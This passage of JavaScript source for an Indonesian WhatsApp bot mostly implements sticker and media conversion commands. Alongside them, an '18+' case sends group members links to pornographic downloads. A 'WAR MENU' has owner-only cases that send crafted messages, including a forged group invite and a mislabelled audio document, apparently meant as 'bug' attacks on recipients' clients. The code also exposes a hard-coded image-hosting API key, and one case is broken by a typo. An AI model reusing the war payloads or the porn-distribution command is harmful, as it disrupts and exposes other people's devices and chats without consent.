                .addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
                .toFormat('webp')
                .save(ran)
            } else {
                reply(`Kirim gambar dengan caption ${prefix}sticker\nDurasi Sticker Video 1-9 Detik`)
            }
            await limitAdd(sender)
break    
       case 'take':
       case 'colong':
       sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
              if (!isQuotedSticker) return reply('Stiker aja om')
              encmedia = JSON.parse(JSON.strngify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
              media = await dha.downloadAndSaveMediaMessage(encmedia)
              anu = args.join(' ').split('|')
              satu = anu[0] !== '' ? anu[0] : `${pushname}`
              dua = typeof anu[1] !== 'undefined' ? anu[1] : `UwU`
              require('./lib/fetch.js').createExif(satu, dua)
              require('./lib/fetch.js').modStick(media, dha, mek, from)
              await limitAdd(sender)
break
       case 'delwm':
       sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
              if (!isQuotedSticker) return reply('Stiker aja om')
              encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
              media = await dha.downloadAndSaveMediaMessage(encmedia)
              anu = args.join(' ').split('|')
              satu = anu[0] !== '' ? anu[0] : ``
              dua = typeof anu[1] !== 'undefined' ? anu[1] : ``
              require('./lib/fetch.js').createExif(satu, dua)
              require('./lib/fetch.js').modStick(media, dha, mek, from)
              await limitAdd(sender)
break
       case 'stikerwm':
       case 'stickerwm':
       case 'swm':
       sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
              var a = arg.split("|")[0];
              var b = arg.split("|")[1];
              if (isMedia && !mek.message.videoMessage || isQuotedImage ) {
              const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
              media = await dha.downloadAndSaveMediaMessage(encmedia)
              await createExif(a,b)
              out = getRandom('.webp')
              ffmpeg(media)
             .on('error', (e) => {
              console.log(e)
              dha.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: mek })
              fs.unlinkSync(media)
})
             .on('end', () => {
            _out = getRandom('.webp')
              spawn('webpmux', ['-set','exif','./sticker/data.exif', out, '-o', _out])
             .on('exit', () => {
              dha.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: mek })
              fs.unlinkSync(out)
              fs.unlinkSync(_out)
              fs.unlinkSync(media)
})
})
             .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
             .toFormat('webp')
             .save(out) 
              } else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
              const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
              const media = await dha.downloadAndSaveMediaMessage(encmedia)
              pe = args.join('')
              var a = pe.split("|")[0];
              var b = pe.split("|")[1];
              await createExif(a,b)
              out = getRandom('.webp')
              ffmpeg(media)
             .on('error', (e) => {
              console.log(e)
              dha.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: mek })
              fs.unlinkSync(media)
})
             .on('end', () => {
            _out = getRandom('.webp')
              spawn('webpmux', ['-set','exif','./sticker/data.exif', out, '-o', _out])
             .on('exit', () => {
              dha.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: mek })
              fs.unlinkSync(out)
              fs.unlinkSync(_out)
              fs.unlinkSync(media)
})
})
             .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
             .toFormat('webp')
             .save(out)       
              } else {
              reply(`Kirim gambar dengan caption ${prefix}swm teks|teks atau tag gambar yang sudah dikirim`)
}
              await limitAdd(sender)
break
      case 'toimg':
      sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
              if (!isQuotedSticker) return reply('reply stickernya')
              sticWait(from)
              encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
              media = await dha.downloadAndSaveMediaMessage(encmedia)
              ran = getRandom('.png')
              exec(`ffmpeg -i ${media} ${ran}`, (err) => {
              fs.unlinkSync(media)
              if (err) return reply('Gagal, pada saat mengkonversi sticker ke gambar')
              buffer = fs.readFileSync(ran)
              dha.sendMessage(from, buffer, image, {quoted: mek, caption: 'Nih'})
              fs.unlinkSync(ran)
})
              await limitAdd(sender)
break

       case 'memeimg':
       case 'memegen':                    
       sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
              top = arg.split('|')[0]
              bottom = arg.split('|')[1]
              var imgbb = require('imgbb-uploader')
              if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length > 0) {
              sticWait(from)
              ger = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
              owgi = await dha.downloadAndSaveMediaMessage(ger)
              anu = await imgbb("39d895963468b814fad0514bd28787e2", owgi)
              teks = `${anu.display_url}`
              ranp = getRandom('.gif')
              rano = getRandom('.webp')
              anu1 = `https://api.memegen.link/images/custom/${top}/${bottom}.png?background=${teks}`
              sendMediaURL(from, `${anu1}`, mess.success)
              } else {
              reply('Gunakan foto/stiker!')
}
               await limitAdd(sender)
break
        case 'togif':
        sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
               if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
               sticWait(from)
               encmediaaa = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
               mediaaa = await dha.downloadAndSaveMediaMessage(encmediaaa)
               a = await webp2gifFile(mediaaa)
               mp4 = await getBuffer(a.result)
               dha.sendMessage(from, mp4, video, {mimetype: 'video/gif', quoted: mek, caption: mess.success})
               fs.unlinkSync(mediaaa)
               } else {
               reply(mess.wrongFormat)
}
               await limitAdd(sender)
break
        case 'tovideo':
        sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
               if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
               sticWait(from)
               encmediaaa = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
               mediaaa = await dha.downloadAndSaveMediaMessage(encmediaaa)
               a = await webp2gifFile(mediaaa)
               mp4 = await getBuffer(a.result)
               dha.sendMessage(from, mp4, video, {mimetype: 'video/mp4', quoted: mek, caption: mess.success})
               fs.unlinkSync(mediaaa)
               } else {
               reply(mess.wrongFormat)
}
               await limitAdd(sender)
break
        case 'tomp3':
        sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
               if (isQuotedVideo || isQuotedAudio){
               sticWait(from)
               encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
               media = await dha.downloadAndSaveMediaMessage(encmedia)
               ran = getRandom('.mp3')
               exec(`ffmpeg -i ${media} ${ran}`, (err) => {
               fs.unlinkSync(media)
               if (err) return reply(`Err: ${err}`)
               buffer453 = fs.readFileSync(ran)
               dha.sendMessage(from, buffer453, audio, { mimetype: 'audio/mp4', quoted: mek })
               fs.unlinkSync(ran)
})
               } else {
               reply(mess.wrongFormat)
}
               await limitAdd(sender)
break      
//------------------<18+ Menu>-----------------------   
       case 'randombokep':
       sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
       if (!isPremium) return reply(`Only Prem`)
              bokep = body.slice(1)
              const bo =['https://www.mediafire.com/download/8hnhjcf3pseubgy','https://www.mediafire.com/download/cty9phda3d1s62u','https://www.mediafire.com/download/8hnhjcf3pseubgy']
              const kep = bo[Math.floor(Math.random() * bo.length)]
              dha.sendMessage(from, '*PERMINTAAN:* '+bokep+'\n*DOSA TANGGUNG PRIBADI*\n*NI BRO FREE BUAT KAMU DOWNLOAD SENDIRI:* '+ kep, text, { quoted: ftoko, caption: `NI BOKEP SAYA DAPAT DARI *©Katashi* DOSA TANGGUNG SENDIRI🗿`})
              await limitAdd(sender)
break
                     
//------------------<WAR MENU>---------------    
 case 'pvp':
 sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
if (!mek.key.fromMe && !isOwner) return
tapib1 = fs.readFileSync('./media/audio/numayei.mp3')
dha.sendMessage(from, tapib1, document, { quoted: mek, filename:`Katashi-Botz ~ 404 ${vipi}.mp3`, mimetype: 'audio/application' })
await reply('Bang mau nanya')
await limitAdd(sender)
break  
case 'pgp':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
if (!isOwner && !mek.key.fromMe) return
buf = Mfake
imeu = await dha.prepareMessage('0@s.whatsapp.net', buf, image) 
imeg = imeu.message.imageMessage
res = await dha.prepareMessageFromContent(from,{
"groupInviteMessage": {
"groupJid": "85296556573-1328272333@g.us",
"inviteCode": "wFHwtOxGQN8OwK2x",
"inviteExpiration": "162533333338378",
"groupName": `Katashi-Botz ~ 404 ${vipi}`,
"jpegThumbnail": "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",
"caption": "https://chat.whatsapp.com/GY74IwuwLlFELw97ByRk79",
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted:imeu, contextInfo:{}})
hexa.relayWAMessage(res)
await setTimeout(() => {
reply('Hacker ( Katashi ~ 404 )')
}, 3000)
await limitAdd(sender)
break   
case 'psp': // BUG TROLLI + BUG GC + TROLLI
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
